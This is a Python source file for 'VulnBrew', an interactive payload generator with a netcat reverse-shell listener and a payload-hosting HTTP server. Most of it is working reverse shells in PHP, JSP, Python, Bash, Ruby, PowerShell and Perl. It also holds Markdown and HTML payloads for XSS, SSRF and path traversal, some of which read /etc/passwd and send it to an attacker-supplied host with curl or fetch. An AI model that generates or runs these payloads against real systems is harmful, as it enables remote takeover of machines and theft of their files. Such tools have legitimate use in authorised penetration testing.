import os
import subprocess

def display_logo():
    """Display the VulnBrew ASCII art logo and introductory message."""
    print(r"""
             (    (
              )   )
             (     )
             _______
          .-'       `-.
         /             \
        |   ~  VULN ~   |
        |   ~  BREW ~   |
         \             /
          `-._______.-'
            //     \\
    """)
    print("         V U L N  B R E W")
    print("\nType 'help' in the console to see available commands.\n")

def get_payload(extension, ip, port):
    """Generate the appropriate payload based on file extension.
    
    Args:
        extension (str): The file extension for the payload.
        ip (str): The attacker's IP address.
        port (str): The port to be used for the reverse shell.

    Returns:
        str: The payload or a message indicating no payload is available for the extension.
    """
    # Predefined payloads based on file extension
    payloads = {
        ".php": (
            # PHP payload for reverse shell
            # This uses PHP's `exec` function to execute a bash command.
            # The bash command establishes a reverse shell connection to the given IP and port.
            f"<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"');?>"
        ),
        ".jsp": (
            # JSP payload for reverse shell
            # This uses Java's `Runtime.getRuntime().exec` to execute a bash command.
            # The bash command establishes a reverse shell connection to the given IP and port.
            f"<% Runtime.getRuntime().exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"); %>"
        ),
        ".py": (
            # Python payload for reverse shell
            # This uses Python's socket and os libraries to create a reverse shell.
            # It connects to the given IP and port, and redirects input/output to the attacker's machine.
            f"import socket,os,pty\ns=socket.socket()\ns.connect((\'{ip}\',{port}))\n"
            f"os.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn('/bin/bash')"
        ),
        ".md": {
            "image_ssrf": (
                # Markdown payload for SSRF using image links
                # When the Markdown parser renders this, it makes a request to the specified IP and port.
                # Useful for testing if the target system can make outbound requests (e.g., SSRF testing).
                f"![exploit](http://{ip}:{port}/malicious.png)"
            ),
            "html_xss": (
                # Markdown payload with embedded HTML for XSS
                # If the Markdown renderer allows inline HTML, this injects a script to trigger XSS.
                # Useful for targeting web-based Markdown viewers or web applications.
                f"![alt text](x)\n<script>\nalert('XSS Exploit Triggered!');\n</script>"
            ),
            "code_injection": (
                # Markdown payload with command injection via code blocks
                # Targets Markdown renderers or users who may copy and execute the provided code.
                # Demonstrates potential command injection vulnerabilities.
                f"```bash\n; curl http://{ip}:{port}/ -d \"$(cat /etc/passwd)\"\n```"
            ),
            "file_inclusion": (
                # Markdown payload for local file inclusion via path traversal
                # If the Markdown renderer processes local file paths, this may expose sensitive files.
                # Useful for testing file inclusion vulnerabilities in Markdown parsers.
                "![exploit](../../../../../etc/passwd)"
            ),
            "javascript_link": (
                # Markdown payload with a malicious JavaScript hyperlink
                # Targets Markdown renderers that allow JavaScript links in anchors.
                # Useful for XSS attacks in browsers or applications with insufficient sanitization.
                "[Click Me](javascript:alert('Exploit Successful!'))"
            ),
            "path_traversal": (
                # Markdown payload for path traversal
                # This attempts to fetch /etc/passwd via a traversal attack.
                f"<script>\nfetch('/../../../../../etc/passwd')\n"
                f"  .then(response => response.text())\n"
                f"  .then(data => {{\n"
                f"    fetch('http://{ip}:{port}/', {{\n"
                f"      method: 'POST',\n"
                f"      body: JSON.stringify({{ fileContents: data }})\n"
                f"    }});\n"
                f"  }})\n"
                f"  .catch(error => console.error('Error fetching /etc/passwd:', error));\n</script>"
            ),
            "lfi": (
                # Markdown payload for Local File Inclusion (LFI)
                # Attempts to fetch /etc/passwd via a vulnerable LFI endpoint.
                f"<script>\nfetch('/file?path=/etc/passwd')\n"
                f"  .then(response => response.text())\n"
                f"  .then(data => {{\n"
                f"    fetch('http://{ip}:{port}/', {{\n"
                f"      method: 'POST',\n"
                f"      body: JSON.stringify({{ fileContents: data }})\n"
                f"    }});\n"
                f"  }})\n"
                f"  .catch(error => console.error('Error fetching file:', error));\n</script>"
            )
        },
        ".sh": (
            # Bash script payload for reverse shell
            # This uses a bash command to redirect input/output to the attacker's machine.
            # It establishes a reverse shell connection to the given IP and port.
            f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        ),
        ".rb": (
            # Ruby payload for reverse shell
            # Uses Ruby's TCPSocket to establish a reverse shell connection.
            # Suitable for systems with Ruby installed.
            f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
        ),
        ".ps1": (
            # PowerShell payload for reverse shell
            # Targets Windows systems using PowerShell scripting.
            # Creates a reverse shell connection back to the attacker's machine.
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
        ),
        ".pl": (
            # Perl payload for reverse shell
            # Uses Perl's socket functionality to create a reverse shell connection.
            # Useful for legacy systems with Perl installed.
            f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
        ),
    }
    return payloads.get(extension, f"# No payload available for {extension}")

def generate_payload():
    """Interactively generate a payload."""
    print("\n[!] Generate a Payload")
    ip = input("[>] Enter the IP address for the payload (public/accessible IP): ").strip()
    if not ip:
        print("[X] IP address cannot be empty.")
        return

    port = input("[>] Enter the port for the reverse shell: ").strip()
    if not port.isdigit():
        print("[X] Port must be a valid number.")
        return

    print("[!] Supported file extensions: .php, .jsp, .py, .md, .sh")
    extension = input("[>] Enter the file extension: ").strip()
    if extension not in [".php", ".jsp", ".py", ".md", ".sh"]:
        print(f"[X] Unsupported file extension: {extension}")
        return

    if extension == ".md":
        # Provide specific options for Markdown exploits with descriptions
        md_exploit_types = {
            "image_ssrf": "(SSRF using an image link, requires a server to fetch the image)",
            "html_xss": "(Embedded XSS using HTML, requires a browser or vulnerable renderer)",
            "code_injection": "(Command injection via a code block, requires user execution)",
            "file_inclusion": "(Local file inclusion using path traversal)",
            "javascript_link": "(XSS through a JavaScript link, requires user interaction)",
            "path_traversal": "(Fetch /etc/passwd via path traversal, requires vulnerability)",
            "lfi": "(Fetch /etc/passwd via Local File Inclusion endpoint)"
        }
        print("[!] Available Markdown Exploits:")
        for i, (md_type, description) in enumerate(md_exploit_types.items(), 1):
            print(f"  {i}. {md_type} {description}")
        choice = input("[>] Select an exploit type: ").strip()
        try:
            md_exploit = list(md_exploit_types.keys())[int(choice) - 1]
        except (IndexError, ValueError):
            print("[X] Invalid selection. Aborting.")
            return
    else:
        md_exploit = None

    filename = input("[>] Enter the output filename (e.g., exploit): ").strip() + extension
    if os.path.exists(filename):
        overwrite = input(f"[!] File '{filename}' already exists. Overwrite? (y/n): ").strip().lower()
        if overwrite != "y":
            print("[X] Aborting payload generation.")
            return

    # Get the appropriate payload
    if extension == ".md":
        payload = get_payload(extension, ip, port).get(md_exploit, f"# No payload available for {md_exploit}")
    else:
        payload = get_payload(extension, ip, port)

    if "No payload" in payload:
        print(f"[X] {payload}")
        return

    # Display payload for review
    print("\n[!] Generated Payload:")
    print("=" * 50)
    print(payload)
    print("=" * 50)

    # Confirm and save the payload
    confirm = input("[>] Save this payload? (y/n): ").strip().lower()
    if confirm == "y":
        try:
            with open(filename, 'w') as f:
                f.write(payload)
            print(f"[✔] Payload saved to {filename}")
        except Exception as e:
            print(f"[X] Error saving payload: {e}")
    else:
        print("[X] Payload not saved.")

def setup_listener(port):
    """Set up a reverse shell listener."""
    print(f"[!] Starting reverse listener on port {port}...")
    os.system(f"nc -lvnp {port}")

def start_http_server(port):
    """Start an HTTP server to host payloads."""
    print(f"[!] Starting HTTP server on port {port}...")
    subprocess.run(["python3", "-m", "http.server", str(port)])

def console():
    """Interactive command console."""
    print("\nWelcome to VulnBrew Console! Type 'help' for a list of commands.\n")
    while True:
        command = input("VulnBrew> ").strip().lower()
        if command == "generate":
            generate_payload()
        elif command.startswith("listener"):
            try:
                port = command.split()[1]
                setup_listener(port)
            except IndexError:
                print("[X] Usage: listener <port>")
        elif command.startswith("http"):
            try:
                port = command.split()[1]
                start_http_server(port)
            except IndexError:
                print("[X] Usage: http <port>")
        elif command == "help":
            print("""
Available Commands:
  generate          - Generate a new payload
  listener <port>   - Set up a reverse shell listener on the specified port
  http <port>       - Start an HTTP server on the specified port
  exit              - Exit the console
  help              - Show this help message
            """)
        elif command == "exit":
            print("Exiting VulnBrew. Goodbye!")
            break
        else:
            print("[X] Unknown command. Type 'help' for a list of commands.")

if __name__ == "__main__":
    display_logo()
    console()
